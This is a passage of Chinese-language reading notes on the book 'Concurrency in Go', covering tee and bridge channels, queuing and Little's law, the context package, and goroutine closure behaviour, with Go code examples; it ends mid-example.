一旦写入了channel,将其影副本设置为nil,以便进一步阻塞写入，而另一个channel可以继续。\t\t\t\t\tcase out2 &lt;- val:\t\t\t\t\t\tout2 = nil // 一旦写入了channel,将其影副本设置为nil,以便进一步阻塞写入，而另一个channel可以继续。\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn out1, out2\t}\tdone := make(chan interface{})\tdefer close(done)\tout1, out2 := tee(done, take(done, repeat(done, 1, 2), 4))\tfor val1 := range out1 {\t\tfmt.Printf(\"out1: %v, out2: %v\\n\", val1, &lt;-out2)\t}}\n\n输出如下：\nout1: 1, out2: 1out1: 2, out2: 2out1: 1, out2: 1out1: 2, out2: 2\n\n注意写入out1和out2是紧密耦合的。直到out1和0ut2都被写入，迭代才能继续。防止出现out1和out2的消费者消费速度不一致，导致数据顺序的问题（适合数据严格同步的场景）。同时，如果消费者没有及时消费，写入操作会阻塞。最后，这个模式也可以作为多个goroutine的同步点。\n桥接 channel 模式在某些情况下，你可能会发现自己希望从一系列的channel中消费产生的值：&lt;-chan &lt;-chan any这与将channel切片合并到单个channel中稍有不同，如我们在本章前面“The or-channel”或“扇出，扇入”中所看到的。一系列的channel需要有序地写入，即使是不同的来源。\npackage mainimport (\t\"fmt\")func main() {\torDone := func(done, c &lt;-chan any) &lt;-chan any {\t\tvalStream := make(chan any)\t\tgo func() {\t\t\tdefer close(valStream)\t\t\tfor {\t\t\t\tselect {\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase v, ok := &lt;-c:\t\t\t\t\tif ok == false {\t\t\t\t\t\treturn\t\t\t\t\t}\t\t\t\t\tselect {\t\t\t\t\tcase valStream &lt;- v:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valStream\t}\tbridge := func(done &lt;-chan any, chanStream &lt;-chan &lt;-chan any) &lt;-chan any {\t\tvalStream := make(chan any) // 这将返回  bridge 中的所有值的 channel\t\tgo func() {\t\t\tdefer close(valStream)\t\t\t// 循环从 chanStream 中获取每个 channel，并提供给嵌套循环来使用\t\t\tfor {\t\t\t\tvar stream &lt;-chan any\t\t\t\tselect {\t\t\t\tcase maybeStream, ok := &lt;-chanStream:\t\t\t\t\tif ok == false {\t\t\t\t\t\treturn\t\t\t\t\t}\t\t\t\t\tstream = maybeStream\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\t}\t\t\t\t// 循环读取已给出的 channel 中的值，将其写入 valStream。当正在循环的流关闭时，将从此流中跳出，继续下一次迭代\t\t\t\tfor val := range orDone(done, stream) {\t\t\t\t\tselect {\t\t\t\t\tcase valStream &lt;- val:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}()\t\treturn valStream\t}\tgenVals := func() &lt;-chan &lt;-chan any {\t\tchanStream := make(chan (&lt;-chan any))\t\tgo func() {\t\t\tdefer close(chanStream)\t\t\tfor i := 0; i &lt; 10; i++ {\t\t\t\tstream := make(chan any, 1)\t\t\t\tstream &lt;- i\t\t\t\tclose(stream)\t\t\t\tchanStream &lt;- stream\t\t\t}\t\t}()\t\treturn chanStream\t}\tfor v := range bridge(nil, genVals()) {\t\tfmt.Printf(\"%v \", v)\t}}\n\n输出如下：0 1 2 3 4 5 6 7 8 9 \n通过桥接，可以在单个 range 中使用处理 channel 的 channel，并专注于循环逻辑。将结构处理的部分放在 bridge 函数中。\n队列排队有时，在你的队列尚未准备好的时候就开始接受请求是很有用的。这个过程被称作队列。\n这也就意味若只要你的stage完成了某些工作，它就会把结果存储在一个稍后其他stage可以获取到结果的临时存储位置，而且你的stage不需要保存一份指向结果的引用。在第3章“channel”中，我们讨论了带缓存的channel,那其实就是一种队列，而且我们当时有足够的理由不去过多讨论使用它。\n虽然在系统中引入队列功能非常有用，但它通常是优化程序时希望采用的最后一种技术之一。预先添加队列可以隐藏同步问题，例如死锁和活锁，并且，随着程序向正确性收敛，你可能会发现需要更多或更少的队列。\n那么队列有什么好处呢？让我们开始回答这个问题，通过解决人们在调整系统性能时犯的一个常见错误：引入队列来尝试解决性能问题。队列几乎不会加速程序的总运行时间，它只会让程序的行为有所不同。对于引入队列的效用问题的答案并不是一个stage的运行时间已经减少，而是它处于阻塞状态的时间减少了。这可以让这个stage继续工作。\n比如在web服务中的用户请求。加入队列之后用户可能会在他们的请求中经历滞后，但他们不会被拒绝服务。通过这种方式，队列的真正用途是将stage分离，以便一个stage的运行时间不会影响另一个stage的运行时间。以这种方式解耦stage,然后级联以改变整个系统的运行时行为，这取决于你的系统，可以是好的也可以是不好的。\n然后我们来讨论调整排队问题。队列应该放在哪里？缓冲区大小应该是多少？这些问题的答案取决于你的管道的性质。首先分析排队可以提高系统整体性能的情况。唯一适用的情况是：\n\n如果在一个stage批处理请求节省时间。\n如果stage中的延迟产生反馈回路（如重试、超时等）进入系统。\n\n第一种情况的一个例子是将输入缓冲到比被设计为发送给（例如，盘）更快的事物（例如，存储器）的stage。\n很显然，这就是Go语言的 bufio 包的目的。缓冲写入比未缓冲写入更快。这是因为在 bufio.Writer 中，写入在内部排队到缓冲区中，直到已经积累了足够的块为止，然后块被写出。这个过程通常称为分块，原因很明显。分块速度更快，因为 bytes.Buffer 必须增加其分配的内存以容纳它必须存储的字节。出于各种原因，增长的内存消耗是昂贵的。所以，我们需要增长的时间越少，整个系统的整体效率就越高。因此，排队提高了整个系统的性能。\n这只是一个简单的内存分块示例，但是你可能会在该领域频繁地进行分块。通常，任何时候执行操作都需要开销，分块可能会提高系统性能。这方面的一些例子是打开数据库事务，计算消息校验和以及分配连续空间。除了分块之外，如果你的算法可以通过支持向后看或排序进行优化，排队也可以起到帮助作用。\n第二种情况是，一个stage的延迟导致管道中接收到了更多的输入，这更难以发现，但也更重要，因为它可能导致上游系统的崩遗。\n这个想法通常被称为负反馈循环，向下螺旋，甚至是死亡螺旋。这是因为管道与上游系统之间存在经常性关系，上游stage或系统提交新请求的速度在某种程度上与管道的有效性有关。如果管道的效率降低到某个临界阈值以下，管道上游的系统开始增加它们对管道的输入（比如重试操作），这导致管道损失更多效率，并且死亡螺旋开始。如果没有某种安全防护，使用管道的系统将永远不能恢复。通过在管道入口处引入队列，你可以用创建请求滞后为代价来打破反馈循环。从调用者进入管道的角度来看，请求似乎正在处理中，但需要很长时间。只要调用者不超时，你的管道将保持稳定。如果主叫方超时，则需要确保你在出列时支持某种检查准备情况。如果你不这样做，你可能会无意中通过处理死亡请求来创建反馈循环，从而降低管道的效率。\n在“队列”理论中，有这样的一条法则，通过足够的取样，可以预测管道的需求率。这被称作利特尔法则。L = λ × W (系统中的平均负载数=负载的平均到达率*负载在系统中花费的平均时间)这个等式只可以应用在所谓的稳定的系统。在管道中，一个稳定的系统是指工作负载进入管道，或者说入口的速率与负载退出系统的速率相等。如果入口的速率超过了出口的速率，你的系统就是不稳定的，而且已经进入了一个死循环。如果你的入口速率没有超过出口速率，你仍旧造成了一个不稳定的系统，但这所导致的也仅仅是你的系统资源并没有被完全使用而已。那并不是这个世界上最槽糕的情况，但是，你可能会在大规模系统（例如，集群或者数据中心）中关心这个问题。\n具体的计算这里省略。总之，队列在系统中可能会很有用，但由于它的复杂性（它会隐藏问题），建议作为实现的最后一个优化手段。\ncontext 包在并发程序中，由于超时，取消或系统其他部分的故障往往需要抢占操作。我们已经看过了创建done channel的习惯用法，该 channel 在你的程序中流动并取消所有阻塞的并发操作。这很好，但它也是有限的。\n如果我们可以在简单的通知上附加传递额外的信息以取消：为什么取消发生，或者我们的函数是否有需要完成的最后期限（超时），这将非常有用。事实证明，对于任何规模的系统来说，使用这些信息来包装已完成的频道是非常常见的，因此Go语言的作者们决定为此创建一个标准模式。它起源于一个在标准库之外的实验功能，但是在Go1.7中，context包被引人标准库中，这使得它成为考虑并发问题时的一个标准的风格。如果看一下上下文包，我们看到它非常简单：\nvar Canceled = errors.New(\"context canceled\")var DeadlineExceeded error = deadlineExceededError{}type CancelFunctype Contextfunc Background() Contextfunc TODO() Contextfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)func WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)func Withvalue(parent Context, key, val interface{})\n\ntype Context interface {    // 当为该 context 工作的 work 被取消时，deadline 会返回时间。    // 在没有设定期限的情况下，会返回 ok==false    // 连续调用 deadline 会返回相同的值    Deadline() (deadline time.Time, ok bool)        // Done 返回一个 channel，当代表此 context 的工作应被取消时，该 channel 会被关闭。    // 如果此 context 永远无法被取消，Done 可能返回 nil。    // 对 Done 的多次调用会返回相同的值。    // Done channel 的关闭可能是异步的，甚至在 cancel 函数返回之后才发生。    //    // WithCancel 会在 cancel 被调用时安排 Done channel 的关闭；    // WithDeadline 会在截止时间到达时安排 Done channel 的关闭；    // WithTimeout 会在超时时间到达时安排 Done channel 的关闭。    //    // Done 的设计目的是用于 select 语句中。    Done() &lt;-chan struct{}        // 如果 Done 尚未关闭，Err 返回 nil。    // 如果 Done 已关闭，Err 返回一个非 nil 的错误，解释原因：    // - 如果 context 被取消，返回 Canceled 错误；    // - 如果 context 的截止时间已过，返回 DeadlineExceeded 错误。    // 一旦 Err 返回一个非 nil 的错误，后续对 Err 的调用将返回相同的错误。    Err() error        // Value 返回与当前 context 中 key 关联的值，如果没有值与 key 关联，则返回 nil。    // 对 Value 的多次调用（使用相同的 key）会返回相同的结果。    //    // 仅将 context 的值用于跨进程和 API 边界的请求范围数据传递，    // 而不是将可选参数传递给函数。    Value(key any) any}\n\n上下文包有两个主要目的：\n\n提供一个可以取消你的调用图中分支的API。\n提供用于通过呼叫传输请求范围数据的数据包。\n\n让我们关注第一个方面：取消。正如我们在本章前面“防止goroutine泄漏”中所学到的，函数中的取消有三个方面：\n\ngoroutine的父goroutine可能想要取消它。\n一个goroutine可能想要取消它的子goroutine。\ngoroutine中的任何阻塞操作都必须是可抢占的，以便它可以被取消。\n\ncontext包帮助管理所有这三个东西。正如我们所提到的，context类型将是你的函数的第一个参数。如果你看看context接口上的方法，你会发现没有任何东西可以改变底层结构的状态。此外，接收context的函数并不能取消它。这保护了调用堆栈上的函数被子函数取消上下文的情况。结合done channel提供的完成函数，运行上下文类型安全的管理其子上下文的取消。\n下面的函数都接收一个 Context 参数，并返回一个 Context。其中还有些其他参数，比如截止时间和超时参数。这些函数用来生成新的 Context 实例（父子上下文）。\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)func WithCancelCause(parent Context) (ctx Context, cancel CancelCauseFunc)func WithDeadline(parent Context, d time.Time) (Context, CancelFunc)func WithDeadlineCause(parent Context, d time.Time) (Context, CancelFunc)func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)func WithTimeoutCause(parent Context, timeout time.Duration) (Context, CancelFunc)func WithValue(parent Context, key, val any) Contextfunc WithoutCancel(parent Context) Context\n\nWithCancel返回一个新的Context,它在调用返回的cancel函数时关闭其done channel。WithDeadline返回一个新的Context,当机器的时钟超过给定的最后期限时，它关闭完成的channel。WithTimeout返回一个新的Context,它在给定的超时时间后关闭其完成的channel。\n如果你的函数需要以某种方式在调用图中取消它后面的函数，它将调用其中一个函数并传递给它的上下文，然后将返回的上下文传递给它的子元素。如果你的函数不需要修改取消行为，那么函数只传递给定的上下文。通过这种方式，调用图的连续图层可以创建符合其需求的上下文，而不会影响其父母节点。这为如何管理调用图的分支提供了一个非常可组合的优雅解决方案。\ncontext包就是本着这种精神来串联起你程序的调用图的。在面向对象的范例中，通常将对经常使用的数据的引用存储为成员变量，但重要的是不要使用context.Context的实例来执行此操作。context.Context的实例可能与外部看起来相同，但在内部它们可能会在每个栈帧更改。出于这个原因，总是将context的实例传递给你的函数是很重要的。通过这种方式，函数具有用于它的上下文，而不是用于堆栈N的上下文。在异步调用图的顶部，你的代码可能不会传递上下文。要启动链，上下文包提供了两个函数来创建上下文的空实例：\nfunc Background()Contextfunc TODO()Context\n\nBackground()只是返回一个空的上下文。TODO()不是用于生产，而是返回一个空的上下文。TODO()的预期目的是作为一个占位符，当你不知道使用哪个上下文，或者你希望你的代码被提供一个上下文，但上游代码还没有提供。\n来看一个使用完成channel模式的例子，并且看看我们可以从切换到使用context包获得什么好处。这是一个同时打印问候和告别的程序：\npackage mainimport (\t\"fmt\"\t\"sync\"\t\"time\")func main() {\tvar wg sync.WaitGroup\tdone := make(chan any)\tdefer close(done)\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printGreeting(done); err != nil {\t\t\tfmt.Printf(\"%v\", err)\t\t\treturn\t\t}\t}()\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printFarewell(done); err != nil {\t\t\tfmt.Printf(\"%v\", err)\t\t\treturn\t\t}\t}()\twg.Wait()}func printGreeting(done &lt;-chan any) error {\tgreeting, err := genGreeting(done)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", greeting)\treturn nil}func printFarewell(done &lt;-chan any) error {\tfarewell, err := genFarewell(done)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", farewell)\treturn nil}func genGreeting(done &lt;-chan any) (string, error) {\tswitch locale, err := locale(done); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"hello\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func genFarewell(done &lt;-chan any) (string, error) {\tswitch locale, err := locale(done); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"goodbye\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func locale(done &lt;-chan any) (string, error) {\tselect {\tcase &lt;-done:\t\treturn \"\", fmt.Errorf(\"canceled\")\tcase &lt;-time.After(1 * time.Minute):\t}\treturn \"EN/US\", nil}\n\n输出如下：\ngoodbye world!hello world!\n\n忽略竞争条件（我们可以在收到问好之前接收到我们的告别！），我们可以看到我们的程序有两个分支同时运行。我们通过创建完成通道并将其传递给我们的调用图来设置标准抢占方法。如果我们在main的任何一点关闭完成的频道，那么两个分支都将被取消。通过引入goroutine,我们已经开辟了以几种不同且有趣的方式来控制该程序的可能性。\n在每个堆栈框架中，一个函数可以影响其下的整个调用堆栈。使用done channel模式，我们可以通过将传入的done channel包装到其他done channel中，然后在其中任何一个通道启动时返回，但我们不会获得关于Context给我们的最后期限和错误的额外信息。下面是使用context包实现的（设置 genGreeting 在放弃调用 locale 之前等待1s，超时时间为1s。并且如果 genGreeting 不成功，也会取消 printFarewall 的调用）：\npackage mainimport (\t\"context\"\t\"fmt\"\t\"sync\"\t\"time\")func main() {\tvar wg sync.WaitGroup\tctx, cancel := context.WithCancel(context.Background())\tdefer cancel()\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printGreeting(ctx); err != nil {\t\t\tfmt.Printf(\"cannot print greeting: %v\\n\", err)\t\t\tcancel()\t\t}\t}()\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printFarewell(ctx); err != nil {\t\t\tfmt.Printf(\"cannot print farewell: %v\\n\", err)\t\t}\t}()\twg.Wait()}func printGreeting(ctx context.Context) error {\tgreeting, err := genGreeting(ctx)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", greeting)\treturn nil}func printFarewell(ctx context.Context) error {\tfarewell, err := genFarewell(ctx)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", farewell)\treturn nil}func genGreeting(ctx context.Context) (string, error) {\tctx, cancel := context.WithTimeout(ctx, 1*time.Second)\tdefer cancel()\tswitch locale, err := locale(ctx); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"hello\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func genFarewell(ctx context.Context) (string, error) {\tswitch locale, err := locale(ctx); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"goodbye\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func locale(ctx context.Context) (string, error) {\tselect {\tcase &lt;-ctx.Done():\t\treturn \"\", ctx.Err()\tcase &lt;-time.After(1 * time.Minute):\t}\treturn \"EN/US\", nil}\n\n输出结果：\ncannot print greeting: context deadline exceededcannot print farewell: context canceled\n\ngenGreeting构建自定义的Context.Context以满足其需求，而不必影响父级的context。如果genGreeting成功返回，并且printGreeting需要再次调用，则可以在不泄漏有关genGreeting如何操作的信息的情况下进行。这种可组合性使你能够编写大型系统，而无需在整个调用图中混淆问题。\n我们可以对这个程序进行另一个改进：因为我们知道loca1e需要大约一分钟的时间来运行，所以我们可以检查是否给了我们最后期限，如果是的话，我们是否会遇到它。即使用context.Context的Deadline方法（在locale上增加截止时间的判断）：\npackage mainimport (\t\"context\"\t\"fmt\"\t\"sync\"\t\"time\")func main() {\tvar wg sync.WaitGroup\tctx, cancel := context.WithCancel(context.Background())\tdefer cancel()\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printGreeting(ctx); err != nil {\t\t\tfmt.Printf(\"cannot print greeting: %v\\n\", err)\t\t\tcancel()\t\t}\t}()\twg.Add(1)\tgo func() {\t\tdefer wg.Done()\t\tif err := printFarewell(ctx); err != nil {\t\t\tfmt.Printf(\"cannot print farewell: %v\\n\", err)\t\t}\t}()\twg.Wait()}func printGreeting(ctx context.Context) error {\tgreeting, err := genGreeting(ctx)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", greeting)\treturn nil}func printFarewell(ctx context.Context) error {\tfarewell, err := genFarewell(ctx)\tif err != nil {\t\treturn err\t}\tfmt.Printf(\"%s world!\\n\", farewell)\treturn nil}func genGreeting(ctx context.Context) (string, error) {\tctx, cancel := context.WithTimeout(ctx, 1*time.Second)\tdefer cancel()\tswitch locale, err := locale(ctx); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"hello\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func genFarewell(ctx context.Context) (string, error) {\tswitch locale, err := locale(ctx); {\tcase err != nil:\t\treturn \"\", err\tcase locale == \"EN/US\":\t\treturn \"goodbye\", nil\t}\treturn \"\", fmt.Errorf(\"unsupported locale\")}func locale(ctx context.Context) (string, error) {\tif deadline, ok := ctx.Deadline(); ok {\t\tif time.Now().Add(1 * time.Minute).After(deadline) {\t\t\treturn \"\", context.DeadlineExceeded\t\t}\t}\tselect {\tcase &lt;-ctx.Done():\t\treturn \"\", ctx.Err()\tcase &lt;-time.After(1 * time.Minute):\t}\treturn \"EN/US\", nil}\n\n虽然这个更改差异很小，但它允许 locale 函数快速失败。在调用成本很高的程序中，可能会节省大量资源和时间，它允许立即失败，而不必等待实际的超时发生。但现实中实践起来非常困难，因为必须要知道下级调用需要多长时间。\n最后来介绍用于存储和检索请求范围数据的Context的数据包。请记住，当一个函数创建一个goroutine和Context时，它通常会启动一个将为请求提供服务的goroutine,并且进一步向下的函数可能需要有关请求的信息。以下是如何在上下文中存储数据以及如何检索数据的示例：\npackage mainimport (\t\"context\"\t\"fmt\")func main() {\tProcessRequest(\"jane\", \"abc123\")}func ProcessRequest(userID, authToken string) {\tctx := context.WithValue(context.Background(), \"userID\", userID)\tctx = context.WithValue(ctx, \"authToken\", authToken)\tHandleResponse(ctx)}func HandleResponse(ctx context.Context) {\tfmt.Printf(\t\t\"handling response for %v (%v)\",\t\tctx.Value(\"userID\"),\t\tctx.Value(\"authToken\"),\t)}\n\n输出如下：handling response for jane (abc123)\n很简单的东西。唯一的限制条件是：\n\n键值必须满足Go语言的可比性概念，也就是运算符==和!=在使用时需要返回正确的结果。\n返回值必须安全，才能从多个goroutine访问。\n\n由于Context的键和值都被定义为interface{},所以当试图检索值时，我们会失去Go语言的类型安全性。key可以是不同的类型，或者与我们提供的key略有不同。值可能与我们预期的不同。出于这些原因，Go语言作者建议你在从Context中存储和检索值时遵循一些规则。首先，他们建议你在软件包中定义一个自定义键类型。只要其他软件包执行相同的操作，则可以防止上下文中的冲突。作为一个提醒，为什么让我们看看一个简短的程序，试图将键存储在具有不同类型的映射中，但具有相同的基础值：\npackage mainimport \"fmt\"type foo inttype bar intfunc main() {\tm := make(map[any]int)\tm[foo(1)] = 1\tm[bar(1)] = 2\tfmt.Printf(\"%v\", m)}\n\n输出如下：map[1:2 1:1]\n虽然基础值是相同的，但不同的类型信息在map中区分它们。\n同时由于我们不应该导出存储数据的key，所以必须导出检索数据的函数。允许这些数据使用者使用静态的、类型安全的函数。最佳实践：\npackage mainimport (\t\"context\"\t\"fmt\")func main() {\tProcessRequest(\"jane\", \"abc123\")}type ctxKey intconst (\tctxUserId ctxKey = iota\tctxAuthToken)func UserId(c context.Context) string {\treturn c.Value(ctxUserId).(string)}func AuthToken(c context.Context) string {\treturn c.Value(ctxAuthToken).(string)}func ProcessRequest(userID, authToken string) {\tctx := context.WithValue(context.Background(), ctxUserId, userID)\tctx = context.WithValue(ctx, ctxAuthToken, authToken)\tHandleResponse(ctx)}func HandleResponse(ctx context.Context) {\tfmt.Printf(\t\t\"handling response for %v (%v)\",\t\tUserId(ctx),\t\tAuthToken(ctx),\t)}\n\n运行结果：handling response for jane (abc123)\n现在有一种类型安全的函数来从context获取值，如果消费者在不同的包中，他们不会知道或关心用于存储信息的ky。但是，这种技术确实会造成问题。（循环依赖）在前面的例子里，假如 ProcessRequest 在 process 包中、HandleResponse 在 response 包中。process 包需要导入 response 包，调用函数。而 context 的 key 定义在 process 包中，response 包需要导入 process 包。会造成循环依赖。\n这会迫使体系结构设计时，将所有导入的数据类型放在一个包中。这也许是件好事。\n关于 context 中存储什么样的数据是有争议的，因为它可以存储任意数据，并且类型不安全会引发错误。\n关于什么是适当的、最普遍的指导，下面是上下文包中的下面有点含糊的注释：\n\n仅将上下文值用于传输进程和请求的请求范围数据，API边界，而不是将可选参数传递给函数。\n\n下面是启发式的建议：\n\n数据应该通过进程或API边界。数据应该用于在进程之间或API 边界传递请求范围的信息（如用户身份、请求 ID、跟踪信息等）。\n数据应该是不可变的如果不是，那么它就不再是请求范围的数据，而是可能被任意修改的共享状态。\n数据应趋向简单类型。数据应该是简单的类型（如 string、int、bool 等），而不是复杂的结构体或对象。\n数据应该是数据，而不是类型与方法。数据应该是纯粹的数据（如 userID、requestID 等），而不是包含方法或行为的类型。\n数据应该有助于修饰操作，而不是驱动它们。数据应该用于修饰操作（如提供额外的上下文信息），而不是驱动操作（如控制算法的行为）。\n\n","categories":["读书笔记"],"tags":["go","并发","《go语言并发之道》"]},{"title":"《go语言并发之道》读书笔记-并发组件","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%B9%B6%E5%8F%91%E7%BB%84%E4%BB%B6/","content":"第三章 - Go语言并发组件这章介绍Go中的特性，以及它如何支持并发。（终于到实际使用了\ngoroutinegoroutine是Go语言程序中最基本的组织单位之一。每个Go语言程序都至少有一个goroutine:main goroutine，它在进程开始时自动创建并启动。几乎在所有的项目中，你迟早会使用goroutine来解决Go语言编程遇到的问题。所以，它们是什么？\n简单地说，goroutine是一个并发的函数（记住：不一定是并行的），与其他代码一起运行。你可以简单地在一个函数之前添加go关键字来触发：go sum()同样可以作为匿名函数使用！这里有一个例子和前面的例子一样。然而，我们不是创建一个基于函数的goroutine,而是创建一个基于匿名函数 goroutine:go func() { // ... }()\n下面的内容来看看 goroutine 是如何工作的？它们是OS线程吗？绿色线程？我们能创造多少个 goroutine？\nGo语言中的goroutine是独一无二的（尽管其他的一些语言有类似的并发原语)。它们不是OS线程，也不是绿色线程（由语言运行时管理的线程），它们是一个更高级别的抽象，称为协程。协程是一种非抢占式的简单并发子goroutine(函数、闭包或方法)，也就是说，它们不能被中断。 取而代之的是，协程有多个点，允许暂停或重新进入。\ngoroutine的独特之处在于它们与Go语言的运行时的深度集成。goroutine没有定义自己的暂停方法或再运行点。Go语言的运行时会观察goroutine的运行时行为，并在它们阻塞时自动挂起它们，然后在它们不被阻塞时恢复它们。在某种程度上，这使它们成为可抢占的，但只是在goroutine被阻塞的情况。 在运行时和goroutine的逻辑之间，是一种优雅的伙伴关系。因此，goroutine可以被认为是一种特殊类型的协程。\n协程和goroutine都是隐式并发结构，但并发并不是协程的属性：必须同时托管多个协程，并给每个协程一个执行的机会。否则，它们就不会并发！请注意，这并不意味着协程是隐式并行的。当然有可能有几个协程按顺序并行执行的假象，事实上，这种情况一直在发生。\nGo语言的主机托管机制是一个名为M:N调度器的实现，这意味着它将M个绿色线程映射到N个OS线程。然后将goroutine安排在绿色线程上。当我们的goroutine数量超过可用的绿色线程时，调度程序将处理分布在可用线程上的goroutine,并确保当这些goroutine被阻塞时，其他的goroutine可以运行。这里只介绍Go语言的并发模型，细节在后续章节中。\nGo语言遵循一个称为ork-join的并发模型。fork这个词指的是在程序中的任意一点，它可以将执行的子分支与共父节点同时运行。jon这个词指的是，在将来某个时候，这些并发的执行分支将会合并在一起。\nGo语言是如何执行fork的，执行的子线程是goroutine。让我们回到简单的goroutine例子：\npackage mainimport &quot;fmt&quot;func main() &#123;\tsayHello := func() &#123;\t\tfmt.Println(&quot;hello&quot;)\t&#125;\tgo sayHello()\t//继续执行自己的逻辑&#125;\n\n在这里，sayHello函数将在goroutine上运行，而程序的其余部分将继续执行。在本例中，没有join点。执行sayHello的goroutine将在未来的某个不确定的时间退出，而程序的其余部分将会继续执行。\n但是，这个例子有一个问题：正如上面所写的程序，它不确定sayHello函数是否会运行。goroutine将会被创建，并计划在Go语言运行时执行，但是它实际上可能没有机会在main goroutine退出之前运行。\n实际上，因为我们省略了min函数的其余部分，为了简单起见，当运行这个小示例时，几乎可以肯定的是，程序将在goroutine被系统调用之前完成执行。因此，你不会看到“hello’”这个词被打印到stdout。你可以在创建goroutine之后执行time.Sleep,但是要记住，这实际上并没有创建一个join点，只有一个竞争条件。如果回顾第1章，你增加了goroutine在程序退出前执行的概率，但你并不能保证一定会执行。join点是保证程序正确性和消除竞争条件的关键。\n为了创建一个join点，你必须同步main goroutine和sayHello goroutine。这可以通过多种方式实现，这里使用：sync.Waitgroup。下面是一个正确的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tsayHello := func() &#123;\t\tdefer wg.Done()\t\tfmt.Println(&quot;hello&quot;)\t&#125;\twg.Add(1)\tgo sayHello()\twg.Wait() // 这就是连接点的使用方式&#125;\n\n输出如下： hello\n这个例子将决定main goroutine,直到goroutine托管sayHello函数为止。我们在示例中使用了许多匿名函数来创建快速goroutine样例。让我们把注意力转移到闭包上。闭包可以从创建它们的作用域中获取变量。如果你在goroutine中运行一个闭包，那么闭包是在这些变量的副本上运行，还是原值的引用上运行？让我们试试看：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tsalutation := &quot;hello&quot;\twg.Add(1)\tgo func() &#123;\t\tdefer wg.Done()\t\tsalutation = &quot;welcome&quot; // 尝试修改 salutation 变量\t&#125;()\twg.Wait()\tfmt.Println(salutation)&#125;\n\n运行结果：welcome事实证明，goroutine在它们所创建的相同地址空间内执行，因此我们的程序打印出“welcome”这个词。让我们再看一个例子。你认为这个程序会输出什么？\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tfor _, salutation := range []string&#123;&quot;hello&quot;, &quot;greetings&quot;, &quot;good day&quot;&#125; &#123;\t\twg.Add(1)\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\tfmt.Println(salutation) // 引用了字符串类型的切片作为创建循环变量的salutation值\t\t&#125;()\t\twg.Wait()\t&#125;&#125;\n\n答案比大多数人想象的要复杂得多，而且是为数不多的令人惊讶的事情之一。大多数人直觉上认为这将会不确定顺序地打印出“hello”“greetings”和“good day”,但看看它做了什么：\ngood daygood daygood day\n\n这里真的是这样吗？在我电脑上的输出是符合大多数人的直觉的：会以不确定的顺序打印出“hello”“greetings”和“good day”。为什么呢？查了资料后发现，这是循环迭代器变量引用的问题：常见错误 For 语句在1.22及后不会出现循环迭代器变量引用的问题。每个循环迭代器变量都是一个新的副本，所以上面程序的输出会是：\nhellogreetingsgood day\n\n并且是乱序的（每次输出都不一致），下面的讨论在1.22之前，1.22及后不会出现。在上面的示例中，goroutine正在运行一个闭包，该闭包使用变量salutation时，字符串的迭代已经结束。当我们循环迭代时，salutation被分配到slice literal中的下一个字符串值。因为计划中的goroutine可能在未来的任何时间点运行，它不确定在goroutine中会打印出什么值。在性能比较好的机器上，在goroutine开始之前循环有很高的概率会退出。这意味着变量的salutation值不在范围之内。然后会发生什么呢？goroutine还能引用一些已经超出范围的东西吗？goroutine不会访问那些可能被垃圾回收的内存吗？这是一个关于如何管理内存的有趣的点。Go语言运行时会足够小心地将对变量salutation值的引用仍然保留，由内存转移到堆，以便goroutine可以继续访问它。\n通常在我的计算机上，在任何goroutine开始运行之前，循环就会退出，所以salutation会被转移到堆中，在我的字符串切片中引用最后一个值“good day”。所以我通常会看到三次“good day”。编写这个循环的正确方法是将salutation的副本传递到闭包中，这样当goroutine运行时，它将从循环的迭代中操作数据：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tvar wg sync.WaitGroup\tfor _, salutations := range []string&#123;&quot;hello&quot;, &quot;greetings&quot;, &quot;good day&quot;&#125; &#123;\t\twg.Add(1)\t\tgo func(salutations string) 